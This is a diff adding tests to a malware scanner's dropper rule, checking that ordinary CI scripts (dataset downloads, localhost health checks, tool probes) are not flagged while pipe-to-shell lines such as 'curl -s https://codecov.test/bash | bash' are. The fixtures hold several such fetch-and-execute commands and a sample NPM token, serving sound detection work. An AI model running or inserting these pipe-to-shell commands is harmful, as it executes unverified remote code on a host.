@@ -4388,3 +4388,101 @@ class TestGatingOnCiIsWhatPrepareScriptsDo:
         assert [
             h for h in PythonAnalyzer.analyse(source) if h.capability.name == "DYNAMIC_DISPATCH"
         ]
+
+
+class TestACiScriptIsNotADropper:
+    """`MALWARE.DROPPER.001` was 72 findings across 49 of the 1,427 repositories, and
+    that is the most serious claim this tool makes: MALICIOUS, CRITICAL, with
+    remediation telling the reader to treat the host as compromised.
+
+    Its CI branch read `ci_hook` plus `egress` plus `execute`, which is what a CI script
+    looks like. vLLM supplied seven: `run-benchmarks.sh` downloads a dataset from
+    huggingface.co and runs `bash -c 'until curl localhost:8000/v1/models'`;
+    `check-ray-compatibility.sh` asks whether a wheel index exists and runs a Python
+    one-liner. Nothing downloaded is executed in either.
+
+    The paragraph inside the rule describes what the branch was written for -- the
+    Codecov uploader, `curl -s https://codecov.io/bash | bash` -- where the fetch and
+    the execution are one act. That is `fetch_exec`, and the branch requires it now.
+    The install-hook branch keeps the looser pair: there the hook IS the execution and
+    it runs on a consumer's machine without being asked.
+
+    Three more shapes from the same repository: a tool-existence probe, a package name,
+    and a loopback health check written without a scheme.
+    """
+
+    def test_a_ci_script_that_fetches_and_runs_separately(self, tmp_path) -> None:
+        flow = tmp_path / ".buildkite" / "scripts"
+        flow.mkdir(parents=True)
+        (flow / "run-benchmarks.sh").write_bytes(
+            b"#!/bin/bash\n"
+            b"(which wget && which curl) || (apt-get update && apt-get install -y wget curl)\n"
+            b"wget https://huggingface.test/datasets/x/resolve/main/data.json\n"
+            b"timeout 600 bash -c 'until curl localhost:8000/v1/models; do sleep 1; done'\n"
+        )
+        assert "MALWARE.DROPPER.001" not in flagged(tmp_path)
+
+    def test_a_ci_script_that_pipes_a_fetch_into_a_shell(self, tmp_path) -> None:
+        """The control, and the shape the branch exists for."""
+        flow = tmp_path / ".buildkite" / "scripts"
+        flow.mkdir(parents=True)
+        (flow / "upload.sh").write_bytes(
+            assemble("#!/bin/bash\n", "curl -s https://codecov.test/bash | bash\n").encode()
+        )
+        assert "MALWARE.DROPPER.001" in flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        ("line", "probe"),
+        [
+            (b"(which wget && which curl) || (apt-get install -y wget curl)", True),
+            (b"if command -v curl > /dev/null; then", True),
+            (b"apt-get install -y ca-certificates curl gnupg", True),
+            (b"apk add --no-cache curl", True),
+            (b"curl -fsSL https://x.test/p | sh", False),
+            (b"which curl && curl https://x.test/p | sh", False),
+        ],
+    )
+    def test_naming_a_tool_is_not_using_it(self, line: bytes, probe: bool) -> None:
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        raw = b"#!/bin/sh\n" + line + b"\n"
+        content = FileContent(path="x.sh", raw=raw, size=len(raw))
+        assert CapabilityDetector._is_tool_probe(content, raw.index(line)) is probe
+
+    @pytest.mark.parametrize(
+        ("line", "local"),
+        [
+            (b"timeout 600 bash -c 'until curl localhost:8000/v1/models; do sleep 1; done'", True),
+            (b"curl -s 127.0.0.1:9090/health", True),
+            (b"curl -X POST localhost:8000/v1/chat -d @-", True),
+            (b'until curl -sf "http://127.0.0.1:\'"$port"\'/health"; do sleep 1; done', True),
+            (b"curl -fsSL https://get.helm.test/install.sh | bash", False),
+        ],
+    )
+    def test_a_schemeless_loopback_target_is_not_egress(self, line: bytes, local: bool) -> None:
+        """`curl localhost:8000/v1/models` is how a CI script waits for the server it
+        just started, and the URL pattern needed a scheme to see it. The quoted form is
+        vLLM's, where the port sits on the other side of a shell quote and the capture
+        ends in a bare colon."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        raw = b"#!/bin/sh\n" + line + b"\n"
+        content = FileContent(path="x.sh", raw=raw, size=len(raw))
+        assert CapabilityDetector._is_local_target(content, raw.index(line)) is local
+
+    @pytest.mark.parametrize(
+        ("line", "reported"),
+        [
+            (b"ARG SCCACHE_S3_NO_CREDENTIALS=0", False),
+            (b"ENV SCCACHE_S3_NO_CREDENTIALS=${USE_SCCACHE:+${SCCACHE_S3_NO_CREDENTIALS}}", False),
+            (b"ARG API_KEY=none", False),
+            (b"ARG NPM_TOKEN=npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", True),
+        ],
+    )
+    def test_a_switch_is_not_a_secret(self, line: bytes, reported: bool) -> None:
+        from cordon_scanner.detect.config_files import RULES
+
+        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CONTAINER.BUILD_SECRET.001")
+        assert bool(rule.pattern.search(line)) is reported
